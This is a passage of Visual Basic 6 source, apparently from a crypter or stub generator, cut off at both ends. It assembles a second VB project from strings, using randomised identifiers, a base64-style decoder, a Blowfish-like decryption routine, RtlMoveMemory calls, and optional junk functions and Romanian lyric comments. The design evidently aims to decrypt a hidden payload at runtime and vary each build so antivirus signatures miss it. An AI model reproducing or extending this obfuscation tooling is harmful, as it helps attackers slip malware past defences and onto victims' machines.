        If Len(tempstring) = 1 Then tempstring = "0" & tempstring
        strDataOut = strDataOut + tempstring
    Next lonDataPtr
   xrn = strDataOut
End Function

Private Function lmain() As String
X = """"
lmain = "Attribute VB_Name = " & X & m.Text & X & vbNewLine & _
"Option Explicit" & vbNewLine & _
"Dim " & m18.Text & "() As String" & vbNewLine & _
"Dim " & m19.Text & "() As String" & vbNewLine & _
"Dim " & m20.Text & "() As String" & vbNewLine & _
"Dim " & m21.Text & " As Variant" & vbNewLine & _
"Dim " & m22.Text & " As Variant" & vbNewLine & _
"Dim " & m23.Text & " As String" & vbNewLine & _
"Dim " & m24.Text & " As String" & vbNewLine & _
"Dim " & m25.Text & " As String" & vbNewLine & _
"Dim " & m26.Text & " As String" & vbNewLine & _
"Dim " & m27.Text & " As String" & vbNewLine & _
"Dim " & m28.Text & " As New " & c.Text & vbNewLine & _
"Dim " & m29.Text & " As Integer" & vbNewLine & _
"Dim " & m30.Text & " As Integer" & vbNewLine

lmain = lmain & "Dim " & m69.Text & " as string" & vbNewLine & _
"Dim " & m70.Text & " as string" & vbNewLine & _
"Dim " & m71.Text & " as string" & vbNewLine & _
"Dim " & m72.Text & " as string" & vbNewLine & _
"Dim " & m73.Text & " as string" & vbNewLine & _
"Dim " & m74.Text & " as string" & vbNewLine & _
"Dim " & c82.Text & " as New " & a.Text & vbNewLine & _
"Dim " & c83.Text & " as string" & vbNewLine & _
"Dim " & c84.Text & " as string" & vbNewLine & _
"Public Declare Sub " & t26.Text & " Lib " & X & "kernel32" & X & " Alias " & X & "RtlMoveMemory" & X & " (" & f.rtl.Text & " As Any, " & f.rtl.Text & " As Any, ByVal " & f.rtl.Text & " As Long)" & vbNewLine & _
"Const " & m16.Text & " = " & X & l1.Text & X & vbNewLine & _
"Const " & m17.Text & " = " & X & l2.Text & X & vbNewLine

If Check6.Value = 1 Then
lmain = lmain & "Private Function " & f.junk11.Text & "()" & vbNewLine & _
"  On error goto " & f.junk12.Text & vbNewLine & _
"  if " & f.junk11.Text & " <> 0 then" & vbNewLine & _
"  " & f.junk11.Text & " = 0" & vbNewLine & _
"  End If" & vbNewLine & _
f.junk12.Text & " :" & vbNewLine & _
"  Exit function" & vbNewLine & _
"End Function" & vbNewLine
End If


If rn2 = "1" Then
lmain = lmain & ro4 & ro3
Else
lmain = lmain & ro3 & ro4
End If

End Function
Private Function ro4()
If rn2 = "1" Then
ro4 = sase & cinci
Else
ro4 = cinci & sase
End If
End Function
Private Function ro3()
If rn2 = "1" Then
ro3 = ro2 & ro1
Else
ro3 = ro1 & ro2
End If
End Function
Private Function ro1()
If rn2 = "1" Then
ro1 = primu & al2lea
Else
ro1 = al2lea & primu
End If
End Function
Private Function ro2()
If rn2 = "1" Then
ro2 = sapte & opula
Else
ro2 = opula & sapte
End If
End Function
Private Function primu()
If rn2 = "1" Then
primu = primu & unu & doi
Else
primu = primu & doi & unu
End If
End Function
Private Function al2lea()
If rn2 = "1" Then
al2lea = al2lea & trei & patru
Else
al2lea = al2lea & patru & trei
End If
Sleep 500
End Function
Public Function lproj() As String
  X = """"
lproj = "Type=Exe" & vbNewLine & _
"Reference=*\G{00020430-0000-0000-C000-000000000046}#2.0#0#..\..\WINDOWS\system32\stdole2.tlb#OLE Automation" & vbNewLine & _
"Module=" & m.Text & "; " & m.Text & ".bas" & vbNewLine & _
"Reference=*\G{7C0FFAB0-CD84-11D0-949A-00A0C91110ED}#1.0#0#..\..\WINDOWS\system32\msdatsrc.tlb#Microsoft Data Source Interfaces" & vbNewLine & _
"Class=" & c.Text & "; " & c.Text & ".cls" & vbNewLine & _
"Class=" & a.Text & "; " & a.Text & ".cls" & vbNewLine & _
"Startup =" & X & "Sub Main" & X & vbNewLine & _
"HelpFile =" & X & X & vbNewLine & _
"Title =" & X & p1.Text & X & vbNewLine & _
"ExeName32 =" & X & l.Text & ".exe" & X & vbNewLine & _
"Path32 = " & X & "..\.." & X & vbNewLine & _
"Command32 =" & X & X & vbNewLine & _
"Name =" & X & p2.Text & X & vbNewLine & _
"HelpContextID =" & X & "0" & X & vbNewLine & _
"CompatibleMode =" & X & "0" & X & vbNewLine

Sleep 500

lproj = lproj & "MajorVer =1" & vbNewLine & _
"MinorVer =" & rn & vbNewLine & _
"RevisionVer =" & rn & vbNewLine & _
"AutoIncrementVer =" & rn & vbNewLine & _
"ServerSupportFiles =0" & vbNewLine & _
"VersionCompanyName =" & X & k.Text & X & vbNewLine


If Option1.Value = True Then
lproj = lproj & "CompilationType =-1" & vbNewLine
Else
lproj = lproj & "CompilationType =0" & vbNewLine
End If

lproj = lproj & "OptimizationType =0" & vbNewLine & _
"FavorPentiumPro(tm) =0" & vbNewLine & _
"CodeViewDebugInfo =0" & vbNewLine & _
"NoAliasing =0" & vbNewLine & _
"BoundsCheck =0" & vbNewLine & _
"OverflowCheck =0" & vbNewLine & _
"FlPointCheck =0" & vbNewLine & _
"FDIVCheck =0" & vbNewLine & _
"UnroundedFP =0" & vbNewLine & _
"StartMode =0" & vbNewLine & _
"Unattended =0" & vbNewLine & _
"Retained =0" & vbNewLine & _
"ThreadPerObject =0" & vbNewLine & _
"MaxNumberOfThreads =1" & vbNewLine & vbNewLine & _
"[MS Transaction Server]" & vbNewLine & _
"AutoRefresh =1" & vbNewLine
End Function
Private Function catalin()
catalin = catalin & "Public Function " & c2.Text & "(" & c13.Text & " As String) As String" & vbNewLine & _
"  If " & c13.Text & " = " & X & X & " Then Exit Function" & vbNewLine & _
"  " & c2.Text & " = StrConv(" & c3.Text & "(" & c13.Text & "), vbUnicode)" & vbNewLine & _
"End Function" & vbNewLine

If Check4.Value = 1 Then
catalin = catalin & "  '" & lRan(20) & vbNewLine & _
"  '20 de tone de bere" & vbNewLine & _
"  '" & lRan(20) & vbbewline & _
"  '20 de kile de has" & vbNewLine & _
"  '" & lRan(20) & vbbewline & _
"  '20 de mii de motive sa nu le lasi" & vbNewLine & _
"  '" & lRan(20) & vbbewline & _
"  '" & lRan(20) & vbNewLine & _
"  '20 de prieteni" & vbNewLine & _
"  '" & lRan(20) & vbbewline & _
"  'De 20 de ori mai multi bani" & vbNewLine & _
"  '" & lRan(20) & vbbewline & _
"  '20 de femei de 20 de ani...." & vbNewLine & _
"  '" & lRan(20) & vbNewLine
Sleep 1000
End If
End Function
Private Function catalin1()
catalin1 = catalin1 & "Public Function " & c3.Text & "(" & c14.Text & " As String) As Byte()" & vbCrLf & _
"  If " & f.Text4.Text & "(47) <> 63 Then " & f.Text3.Text & vbCrLf & _
"  Dim " & c15.Text & "() As Byte" & vbCrLf & _
"  Dim " & c16.Text & "() As Byte" & vbCrLf & _
"  Dim " & c17.Text & "() As Byte" & vbCrLf & _
"  Dim " & c18.Text & " As Long" & vbCrLf & _
"  Dim " & c19.Text & " As Long" & vbCrLf & _
"  " & c15.Text & " = Replace(Replace(" & c14.Text & ", vbCrLf, " & X & X & "), " & X & "=" & X & ", " & X & X & ")" & vbCrLf & _
"  ReDim " & c16.Text & "(LBound(" & c15.Text & ") To (UBound(" & c15.Text & ") * 2)) As Byte" & vbCrLf & _
"  " & c19.Text & " = LBound(" & c16.Text & ")" & vbCrLf & _
"  For " & c18.Text & " = LBound(" & c15.Text & ") To UBound(" & c15.Text & ")" & vbCrLf & _
"  " & c15.Text & "(" & c18.Text & ") = " & f.Text4.Text & "(" & c15.Text & "(" & c18.Text & "))" & vbCrLf & _
"  Next " & c18.Text & vbCrLf & _
"  For " & c18.Text & " = LBound(" & c15.Text & ") To (UBound(" & c15.Text & ") - ((UBound(" & c15.Text & ") Mod 8) + 8)) Step 8" & vbCrLf & _
"  " & c16.Text & "(" & c19.Text & ") = (" & c15.Text & "(" & c18.Text & ") * k_bytShift2) + (" & c15.Text & "(" & c18.Text & " + 2) \ k_bytShift4)" & vbCrLf & _
"  " & c16.Text & "(" & c19.Text & " + 1) = ((" & c15.Text & "(" & c18.Text & " + 2) And k_bytMask2) * k_bytShift4) + (" & c15.Text & "(" & c18.Text & " + 4) \ k_bytShift2)" & vbCrLf & _
"  " & c16.Text & "(" & c19.Text & " + 2) = ((" & c15.Text & "(" & c18.Text & " + 4) And k_bytMask1) * k_bytShift6) + " & c15.Text & "(" & c18.Text & " + 6)" & vbCrLf & _
"  " & c19.Text & " = " & c19.Text & " + 3" & vbCrLf & _
"  Next " & c18.Text & vbCrLf & _
"  Select Case (UBound(" & c15.Text & ") Mod 8):" & vbCrLf & _
"  Case 3:" & vbCrLf
catalin1 = catalin1 & "  " & c16.Text & "(" & c19.Text & ") = (" & c15.Text & "(" & c18.Text & ") * k_bytShift2) + (" & c15.Text & "(" & c18.Text & " + 2) \ k_bytShift4)" & vbNewLine & _
"  Case 5:" & vbNewLine & _
"  " & c16.Text & "(" & c19.Text & ") = (" & c15.Text & "(" & c18.Text & ") * k_bytShift2) + (" & c15.Text & "(" & c18.Text & " + 2) \ k_bytShift4)" & vbNewLine & _
"  " & c16.Text & "(" & c19.Text & " + 1) = ((" & c15.Text & "(" & c18.Text & " + 2) And k_bytMask2) * k_bytShift4) + (" & c15.Text & "(" & c18.Text & " + 4) \ " & c18.Text & ")" & vbNewLine & _
"  " & c19.Text & " = " & c19.Text & " + 1" & vbNewLine & _
"  Case 7:" & vbNewLine & _
"  " & c16.Text & "(" & c19.Text & ") = (" & c15.Text & "(" & c18.Text & ") * k_bytShift2) + (" & c15.Text & "(" & c18.Text & " + 2) \ k_bytShift4)" & vbNewLine & _
"  " & c16.Text & "(" & c19.Text & " + 1) = ((" & c15.Text & "(" & c18.Text & " + 2) And k_bytMask2) * k_bytShift4) + (" & c15.Text & "(" & c18.Text & " + 4) \ k_bytShift2)" & vbNewLine & _
"  " & c16.Text & "(" & c19.Text & " + 2) = ((" & c15.Text & "(" & c18.Text & " + 4) And k_bytMask1) * k_bytShift6) + " & c15.Text & "(" & c18.Text & " + 6)" & vbNewLine & _
"  " & c19.Text & " = " & c19.Text & " + 2" & vbNewLine & _
"  End Select" & vbNewLine & _
"  ReDim bytResult(LBound(" & c16.Text & ") To " & c19.Text & ") As Byte" & vbNewLine & _
"  If LBound(" & c16.Text & ") = 0 Then " & c19.Text & " = " & c19.Text & " + 1" & vbNewLine & _
"  " & t26.Text & " VarPtr(bytResult(LBound(bytResult))), VarPtr(" & c16.Text & "(LBound(" & c16.Text & "))), " & c19.Text & vbNewLine & _
"  " & c3.Text & " = " & c17.Text & vbNewLine & _
"End Function" & vbNewLine

End Function
Private Function catalin2()
catalin2 = catalin2 & "Private Static Sub " & c4.Text & "(" & c63.Text & " As Long, " & c64.Text & " As Long)" & vbNewLine & _
"  Dim " & c65.Text & " As Long, " & c66.Text & " As Long, " & c67.Text & " As Long" & vbNewLine & _
"  " & c67.Text & " = " & c64.Text & vbNewLine & _
"  " & c64.Text & " = " & c63.Text & " Xor m_pBox(" & f.Text5.Text & " + 1)" & vbNewLine & _
"  " & c63.Text & " = " & c67.Text & " Xor m_pBox(" & f.Text5.Text & ")" & vbNewLine & _
"  " & c66.Text & " = " & f.Text5.Text & " - 2" & vbNewLine & _
"  For " & c65.Text & " = 0 To (" & f.Text5.Text & " \ 2 - 1)" & vbNewLine & _
"  " & c63.Text & " = " & c63.Text & " Xor " & c6.Text & "(" & c64.Text & ")" & vbNewLine & _
"  " & c64.Text & " = " & c64.Text & " Xor m_pBox(" & c66.Text & " + 1)" & vbNewLine & "  " & c64.Text & " = " & c64.Text & " Xor " & c6.Text & "(" & c63.Text & ")" & vbNewLine & _
"  " & c63.Text & " = " & c63.Text & " Xor m_pBox(" & c66.Text & ")" & vbNewLine & _
"  " & c66.Text & " = " & c66.Text & " - 2" & vbNewLine & _
"  Next" & vbNewLine & _
"End Sub" & vbNewLine
End Function
Private Function catalin3()
catalin3 = catalin3 & "Public Function " & c1.Text & "(" & c21.Text & " As String, Optional " & c22.Text & " As String, Optional " & c23.Text & " As Boolean) As String" & vbNewLine & _
"  Dim " & c20.Text & "() As Byte" & vbNewLine & _
"  If " & c23.Text & " = True Then " & c21.Text & " = " & c2.Text & "(" & c21.Text & ")" & vbNewLine & _
"  " & c20.Text & "() = StrConv(" & c21.Text & ", vbFromUnicode)" & vbNewLine & _
"  Call " & c5.Text & "(" & c20.Text & "(), " & c22.Text & ")" & vbNewLine & _
"  " & c1.Text & " = StrConv(" & c20.Text & "(), vbUnicode)" & vbNewLine & _
"  Erase " & c20.Text & "(): " & c22.Text & " = " & X & X & ": " & c21.Text & " = " & X & X & vbNewLine & _
"End Function" & vbNewLine

If Check6.Value = 1 Then
catalin3 = catalin3 & "Private Function " & f.junk5.Text & "()" & vbNewLine & _
"  On error goto " & f.junk6.Text & vbNewLine & _
"  if " & f.junk5.Text & " <> 0 then" & vbNewLine & _
"  " & f.junk5.Text & " = 0" & vbNewLine & _
"  End If" & vbNewLine & _
f.junk6.Text & " :" & vbNewLine & _
"  Exit function" & vbNewLine & _
"End Function" & vbNewLine
End If
Sleep 500
End Function
Private Function catalin4()
catalin4 = catalin4 & "Public Sub " & c5.Text & "(" & c24.Text & "() As Byte, Optional " & c25.Text & " As String)" & vbNewLine & _
"  On Error GoTo " & c79.Text & vbNewLine & _
"  Dim " & c70.Text & " As Long, " & c71.Text & " As Long, " & c72.Text & " As Long, " & c73.Text & " As Long, " & c74.Text & " As Long, " & c75.Text & " As Long, " & c76.Text & " As Long, " & c77.Text & " As Long, " & c78.Text & " As Long" & vbNewLine & _
"  If (Len(" & c25.Text & ") > 0) Then Me." & c11.Text & " = " & c25.Text & vbNewLine & _
"  " & c74.Text & " = UBound(" & c24.Text & ") + 1" & vbNewLine & _
"  For " & c70.Text & " = 0 To (" & c74.Text & " - 1) Step 8" & vbNewLine & _
"  Call " & c7.Text & "(" & c72.Text & ", " & c24.Text & "(), " & c70.Text & ")" & vbNewLine & _
"  Call " & c7.Text & "(" & c73.Text & ", " & c24.Text & "(), " & c70.Text & " + 4)" & vbNewLine & _
"  Call " & c4.Text & "(" & c72.Text & ", " & c73.Text & ")" & vbNewLine & _
"  " & c72.Text & " = " & c72.Text & " Xor " & c75.Text & vbNewLine & _
"  " & c73.Text & " = " & c73.Text & " Xor " & c76.Text & vbNewLine & _
"  Call " & c7.Text & "(" & c75.Text & ", " & c24.Text & "(), " & c70.Text & ")" & vbNewLine & _
"  Call " & c7.Text & "(" & c76.Text & ", " & c24.Text & "(), " & c70.Text & " + 4)" & vbNewLine & _
"  Call " & c8.Text & "(" & c72.Text & ", " & c24.Text & "(), " & c70.Text & ")" & vbNewLine
catalin4 = catalin4 & "  Call " & c8.Text & "(" & c73.Text & ", " & c24.Text & "(), " & c70.Text & " + 4)" & vbNewLine & _
"  If " & c70.Text & " >= " & c78.Text & " Then" & vbNewLine & _
"  " & c77.Text & " = Int((" & c70.Text & " / " & c74.Text & ") * 100)" & vbNewLine & _
"  " & c78.Text & " = (" & c74.Text & " * ((" & c77.Text & " + 1) / 100)) + 1" & vbNewLine & _
"  RaiseEvent " & f.Text1.Text & "(" & c77.Text & ")" & vbNewLine & _
"  End If" & vbNewLine & _
"  Next" & vbNewLine & _
"  Call " & t26.Text & "(" & c71.Text & ", " & c24.Text & "(8), 4)" & vbNewLine & _
"  Call " & t26.Text & "(" & c24.Text & "(0), " & c24.Text & "(12), " & c71.Text & ")" & vbNewLine & _
"  ReDim Preserve " & c24.Text & "(" & c71.Text & " - 1)" & vbNewLine & _
"  If " & c77.Text & " <> 100 Then RaiseEvent " & f.Text1.Text & "(100)" & vbNewLine & _
"" & c79.Text & ":" & vbNewLine & _
"End Sub" & vbNewLine
End Function
Private Function catalin5()
catalin5 = catalin5 & "Private Static Function " & c6.Text & "(ByVal " & c68.Text & " As Long) As Long" & vbNewLine & _
"  Dim " & c69.Text & "(0 To 3) As Byte" & vbNewLine & _
"  Call " & t26.Text & "(" & c69.Text & "(0), " & c68.Text & ", 4)" & vbNewLine & _
"  If (m_RunningComp) Then " & c6.Text & " = (((m_sBox(0, " & c69.Text & "(3)) + m_sBox(1, " & c69.Text & "(2))) Xor m_sBox(2, " & c69.Text & "(1))) + m_sBox(3, " & c69.Text & "(0))) Else " & c6.Text & " = " & c9.Text & "((" & c9.Text & "(m_sBox(0, " & c69.Text & "(3)), m_sBox(1, " & c69.Text & "(2))) Xor m_sBox(2, " & c69.Text & "(1))), m_sBox(3, " & c69.Text & "(0)))" & vbNewLine & _
"End Function" & vbNewLine
End Function
Private Function catalin6()
catalin6 = catalin6 & "Private Static Sub " & c7.Text & "(" & c60.Text & " As Long, " & c61.Text & "() As Byte, " & c62.Text & " As Long)" & vbNewLine & _
"  Dim " & c80.Text & "(0 To 3) As Byte" & vbNewLine & _
"  " & c80.Text & "(3) = " & c61.Text & "(" & c62.Text & ")" & vbNewLine & _
"  " & c80.Text & "(2) = " & c61.Text & "(" & c62.Text & " + 1)" & vbNewLine & _
"  " & c80.Text & "(1) = " & c61.Text & "(" & c62.Text & " + 2)" & vbNewLine & _
"  " & c80.Text & "(0) = " & c61.Text & "(" & c62.Text & " + 3)" & vbNewLine & _
"  Call " & t26.Text & "(" & c60.Text & ", " & c80.Text & "(0), 4)" & vbNewLine & _
"End Sub" & vbNewLine

If Check4.Value = 1 Then
catalin6 = catalin6 & "  '" & lRan(19) & vbNewLine & _
"  '2004 pura fictiune te transport in timp" & vbNewLine & _
"  '" & lRan(15) & vbbewline & _
"  'Vei calatori gratuit spre un nou regim" & vbNewLine & _
"  '" & lRan(34) & vbNewLine & _
"  'Stim deja cazuri de coruptie din senat, guvern, armata si politie" & vbNewLine & _
"  '" & lRan(30) & vbbewline & _
"  'Oare nimeni n-a dat atentie in atatia ani" & vbNewLine & _
"  '" & lRan(27) & vbNewLine & _
"  'sau aveti pacerea sa fi-ti dusi de cleptomani" & vbNewLine & _
"  '" & lRan(18) & vbbewline & _
"  'n-am coborat ieri din bananieri" & vbNewLine & _
"  '" & lRan(30) & vbNewLine & _
"  'momentan sunt in audiere la premier" & vbNewLine & _
"  '" & lRan(10) & vbNewLine
Sleep 1000
End If
End Function
Private Function catalin7()
catalin7 = catalin7 & "Private Static Sub " & c8.Text & "(" & c48.Text & " As Long, " & c49.Text & "() As Byte, " & c50.Text & " As Long)" & vbNewLine & _
"  Dim " & c51.Text & "(0 To 3) As Byte" & vbNewLine & _
"  Call " & t26.Text & "(" & c51.Text & "(0), " & c48.Text & ", 4)" & vbNewLine & _
"  " & c49.Text & "(" & c50.Text & ") = " & c51.Text & "(3)" & vbNewLine & _
"  " & c49.Text & "(" & c50.Text & " + 1) = " & c51.Text & "(2)" & vbNewLine & _
"  " & c49.Text & "(" & c50.Text & " + 2) = " & c51.Text & "(1)" & vbNewLine & _
"  " & c49.Text & "(" & c50.Text & " + 3) = " & c51.Text & "(0)" & vbNewLine & _
"End Sub" & vbNewLine
End Function
Private Function catalin8()
catalin8 = catalin8 & "Private Static Function " & c9.Text & "(ByVal " & c52.Text & " As Long, " & c53.Text & " As Long) As Long" & vbNewLine & _
"  Dim " & c54.Text & "(0 To 3) As Byte, " & c55.Text & "(0 To 3) As Byte, " & c56.Text & "(0 To 3) As Byte, " & c57.Text & " As Long, " & c58.Text & " As Long, " & c59.Text & " As Long" & vbNewLine & _
"  Call " & t26.Text & "(" & c54.Text & "(0), " & c52.Text & ", 4)" & vbNewLine & _
"  Call " & t26.Text & "(" & c55.Text & "(0), " & c53.Text & ", 4)" & vbNewLine & _
"  " & c57.Text & " = 0" & vbNewLine & _
"  For " & c59.Text & " = 0 To 3" & vbNewLine & _
"  " & c58.Text & " = CLng(" & c54.Text & "(" & c59.Text & ")) + CLng(" & c55.Text & "(" & c59.Text & ")) + " & c57.Text & vbNewLine & _
"  " & c56.Text & "(" & c59.Text & ") = " & c58.Text & " And 255" & vbNewLine & _
"  " & c57.Text & " = " & c58.Text & " \ 256" & vbNewLine & _
"  Next" & vbNewLine & _
"  Call " & t26.Text & "(" & c9.Text & ", " & c56.Text & "(0), 4)" & vbNewLine & _
"End Function" & vbNewLine
Sleep 500
End Function
Private Function catalin9()
catalin9 = catalin9 & "Private Function " & c10.Text & "(" & c40.Text & " As Long, " & c41.Text & " As Long) As Long" & vbNewLine & _
"  Dim " & c42.Text & "(0 To 3) As Byte, " & c43.Text & "(0 To 3) As Byte, " & c44.Text & "(0 To 3) As Byte, " & c45.Text & " As Long, " & c46.Text & " As Long , " & c47.Text & " as long" & vbNewLine & _
"  Call " & t26.Text & "(" & c42.Text & "(0), " & c40.Text & ", 4)" & vbNewLine & _
"  Call " & t26.Text & "(" & c43.Text & "(0), " & c41.Text & ", 4)" & vbNewLine & _
"  Call " & t26.Text & "(" & c44.Text & "(0), " & c10.Text & ", 4)" & vbNewLine & "  For " & c47.Text & " = 0 To 3" & vbNewLine & _
"  " & c46.Text & " = CLng(" & c42.Text & "(" & c47.Text & ")) - CLng(" & c43.Text & "(" & c47.Text & ")) - " & c45.Text & vbNewLine & _
"  If (" & c46.Text & " < 0) Then" & vbNewLine & _
"  " & c46.Text & " = " & c46.Text & " + 256" & vbNewLine & _
"  " & c45.Text & " = 1" & vbNewLine & _
"  Else" & vbNewLine & _
"  " & c45.Text & " = 0" & vbNewLine & _
"  End If" & vbNewLine & _
"  " & c44.Text & "(" & c47.Text & ") = " & c46.Text & vbNewLine & _
"  Next" & vbNewLine & _
"  Call " & t26.Text & "(" & c10.Text & ", " & c44.Text & "(0), 4)" & vbNewLine & _
"End Function" & vbNewLine

If Check4.Value = 1 Then
catalin9 = catalin9 & "  '" & lRan(23) & vbNewLine & _
"  'Am smuls 3 plante din gradina de la 9" & vbNewLine & _
"  '" & lRan(31) & vbbewline & _
"  'Suspinand in parc, salivand iarba'n 2" & vbNewLine & _
"  '" & lRan(15) & vbNewLine & _
"  'Am rulat 2 trompete, n'o sa suflu'n ele" & vbNewLine & _
"  '" & lRan(18) & vbNewLine & _
"  'O sa cant obscenitatzi despre coardele mele" & vbNewLine & _
"  '" & lRan(28) & vbbewline & _
"  'Ingeru ' meu pazitor e drogat pe canapea" & vbNewLine & _
"  '" & lRan(10) & vbNewLine & _
"  'Vezi c***e ca n'ai grija de persoana mea" & vbNewLine & _
"  '" & lRan(12) & vbNewLine
Sleep 500
End If

End Function
Private Function catalin10()
catalin10 = catalin10 & "Public Property Let " & c11.Text & "(" & c31.Text & " As String)" & vbNewLine & _
"  Dim " & c32.Text & " As Long, " & c33.Text & " As Long, " & c34.Text & " As Long, " & c35.Text & " As Long, " & c36.Text & " As Long, " & c37.Text & " As Long, " & c38.Text & "() As Byte, " & c39.Text & " As Long" & vbNewLine & _
"  Class_Initialize" & vbNewLine & _
"  If (m_KeyValue = " & c31.Text & ") Then Exit Property" & vbNewLine & _
"  m_KeyValue = " & c31.Text & "" & vbNewLine & _
"  " & c39.Text & " = Len(" & c31.Text & ")" & vbNewLine & _
"  " & c38.Text & "() = StrConv(" & c31.Text & ", vbFromUnicode)" & vbNewLine & _
"  " & c33.Text & " = 0" & vbNewLine & _
"  For " & c32.Text & " = 0 To (" & f.Text5.Text & " + 1)" & vbNewLine & _
"  " & c35.Text & " = 0" & vbNewLine & _
"  For " & c34.Text & " = 0 To 3" & vbNewLine & _
"  Call " & t26.Text & "(ByVal VarPtr(" & c35.Text & ") + 1, " & c35.Text & ", 3)" & vbNewLine & _
"  " & c35.Text & " = (" & c35.Text & " Or " & c38.Text & "(" & c33.Text & "))" & vbNewLine & _
"  " & c33.Text & " = " & c33.Text & " + 1" & vbNewLine & "  If (" & c33.Text & " >= " & c39.Text & ") Then " & c33.Text & " = 0" & vbNewLine

catalin10 = catalin10 & "  Next" & vbNewLine & _
"  m_pBox(" & c32.Text & ") = m_pBox(" & c32.Text & ") Xor " & c35.Text & vbNewLine & _
"  Next" & vbNewLine & _
"  " & c36.Text & " = 0: " & c37.Text & " = 0" & vbNewLine & _
"  For " & c32.Text & " = 0 To (" & f.Text5.Text & " + 1) Step 2" & vbNewLine & _
"  Call " & c12.Text & "(" & c36.Text & ", " & c37.Text & ")" & vbNewLine & _
"  m_pBox(" & c32.Text & ") = " & c36.Text & vbNewLine & _
"  m_pBox(" & c32.Text & " + 1) = " & c37.Text & vbNewLine & _
"  Next" & vbNewLine & _
"  For " & c32.Text & " = 0 To 3" & vbNewLine & _
"  For " & c33.Text & " = 0 To 255 Step 2" & vbNewLine & _
"  Call " & c12.Text & "(" & c36.Text & ", " & c37.Text & ")" & vbNewLine & _
"  m_sBox(" & c32.Text & ", " & c33.Text & ") = " & c36.Text & vbNewLine & _
"  m_sBox(" & c32.Text & ", " & c33.Text & " + 1) = " & c37.Text & vbNewLine & _
"  Next" & vbNewLine & _
"  Next" & vbNewLine & _
"End Property" & vbNewLine

End Function
Private Function catalin11()
catalin11 = catalin11 & "Private Static Sub " & c12.Text & "(" & c27.Text & " As Long, " & c28.Text & " as long)" & vbNewLine & _
"  Dim " & c29.Text & " As Long, " & c30.Text & " As Long, " & c26.Text & " As Long" & vbNewLine & _
"  " & c30.Text & " = 0" & vbNewLine & _
"  For " & c29.Text & " = 0 To (" & f.Text5.Text & " \ 2 - 1)" & vbNewLine & _
"  " & c27.Text & " = " & c27.Text & " Xor m_pBox(" & c30.Text & ")" & vbNewLine & _
"  " & c28.Text & " = " & c28.Text & " Xor " & c6.Text & "(" & c27.Text & ")" & vbNewLine & _
"  " & c28.Text & " = " & c28.Text & " Xor m_pBox(" & c30.Text & " + 1)" & vbNewLine & _
"  " & c27.Text & " = " & c27.Text & " Xor " & c6.Text & "(" & c28.Text & ")" & vbNewLine & _
"  " & c30.Text & " = " & c30.Text & " + 2" & vbNewLine & _
"  Next" & vbNewLine & _
"  " & c26.Text & " = " & c28.Text & "" & vbNewLine & _
"  " & c28.Text & " = " & c27.Text & " Xor m_pBox(" & f.Text5.Text & ")" & vbNewLine & _
"  " & c27.Text & " = " & c26.Text & " Xor m_pBox(" & f.Text5.Text & " + 1)" & vbNewLine & _
"End Sub" & vbNewLine

If Check4.Value = 1 Then
catalin11 = catalin11 & "  '" & lRan(20) & vbNewLine & _
"  'Tre ' sa trag un shot, treaz nu ma mai suport" & vbNewLine & _
"  '" & lRan(30) & vbbewline & _
"  'Cu un ultim efort o sa ma'mbat ca un porc" & vbNewLine & _
"  '" & lRan(20) & vbNewLine & _
"  'Vreau sa afle totzi, nu sa citesca'n stele" & vbNewLine & _
"  '" & lRan(23) & vbbewline & _
"  'Ma comport exemplar dupa standardele mele" & vbNewLine & _
"  '" & lRan(15) & vbNewLine
Sleep 100
End If
End Function
Private Function mdea()
mdea = "Private Sub " & f.Text3.Text & "()" & vbNewLine

mdea = mdea & "  " & f.Text4.Text & "(0) = 65" & vbNewLine & _
"  " & f.Text4.Text & "(1) = 66" & vbNewLine & _
"  " & f.Text4.Text & "(2) = 67" & vbNewLine & _
"  " & f.Text4.Text & "(3) = 68" & vbNewLine & _
"  " & f.Text4.Text & "(4) = 69" & vbNewLine & _
"  " & f.Text4.Text & "(5) = 70" & vbNewLine & _
"  " & f.Text4.Text & "(6) = 71" & vbNewLine & _
"  " & f.Text4.Text & "(7) = 72" & vbNewLine & _
"  " & f.Text4.Text & "(8) = 73" & vbNewLine & _
"  " & f.Text4.Text & "(9) = 74" & vbNewLine & _
"  " & f.Text4.Text & "(10) = 75" & vbNewLine & _
"  " & f.Text4.Text & "(11) = 76" & vbNewLine & _
"  " & f.Text4.Text & "(12) = 77" & vbNewLine & _
"  " & f.Text4.Text & "(13) = 78" & vbNewLine & _
"  " & f.Text4.Text & "(14) = 79" & vbNewLine & _
"  " & f.Text4.Text & "(15) = 80" & vbNewLine & _
"  " & f.Text4.Text & "(16) = 81" & vbNewLine & _
"  " & f.Text4.Text & "(17) = 82" & vbNewLine & _
"  " & f.Text4.Text & "(18) = 83" & vbNewLine & _
"  " & f.Text4.Text & "(19) = 84" & vbNewLine & _
"  " & f.Text4.Text & "(20) = 85" & vbNewLine & _
"  " & f.Text4.Text & "(21) = 86" & vbNewLine & _
"  " & f.Text4.Text & "(22) = 87" & vbNewLine & _
"  " & f.Text4.Text & "(23) = 88" & vbNewLine & _
"  " & f.Text4.Text & "(24) = 89" & vbNewLine
  
mdea = mdea & "  " & f.Text4.Text & "(25) = 90" & vbNewLine & _
"  " & f.Text4.Text & "(26) = 97" & vbNewLine & _
"  " & f.Text4.Text & "(27) = 98" & vbNewLine & _
"  " & f.Text4.Text & "(28) = 99" & vbNewLine & _
"  " & f.Text4.Text & "(29) = 100" & vbNewLine & _
"  " & f.Text4.Text & "(30) = 101" & vbNewLine & _
"  " & f.Text4.Text & "(31) = 102" & vbNewLine & _
"  " & f.Text4.Text & "(32) = 103" & vbNewLine & _
"  " & f.Text4.Text & "(33) = 104" & vbNewLine & _
"  " & f.Text4.Text & "(34) = 105" & vbNewLine & _
"  " & f.Text4.Text & "(35) = 106" & vbNewLine & _
"  " & f.Text4.Text & "(36) = 107" & vbNewLine & _
"  " & f.Text4.Text & "(37) = 108" & vbNewLine & _
"  " & f.Text4.Text & "(38) = 109" & vbNewLine & _
"  " & f.Text4.Text & "(39) = 110" & vbNewLine & _
"  " & f.Text4.Text & "(40) = 111" & vbNewLine & _
"  " & f.Text4.Text & "(41) = 112" & vbNewLine & _
"  " & f.Text4.Text & "(42) = 113" & vbNewLine & _
"  " & f.Text4.Text & "(43) = 114" & vbNewLine & _
"  " & f.Text4.Text & "(44) = 115" & vbNewLine & _
"  " & f.Text4.Text & "(45) = 116" & vbNewLine & _
"  " & f.Text4.Text & "(46) = 117" & vbNewLine & _
"  " & f.Text4.Text & "(47) = 118" & vbNewLine & _
"  " & f.Text4.Text & "(48) = 119" & vbNewLine & _
"  " & f.Text4.Text & "(49) = 120" & vbNewLine
  
mdea = mdea & "  " & f.Text4.Text & "(50) = 121" & vbNewLine & _
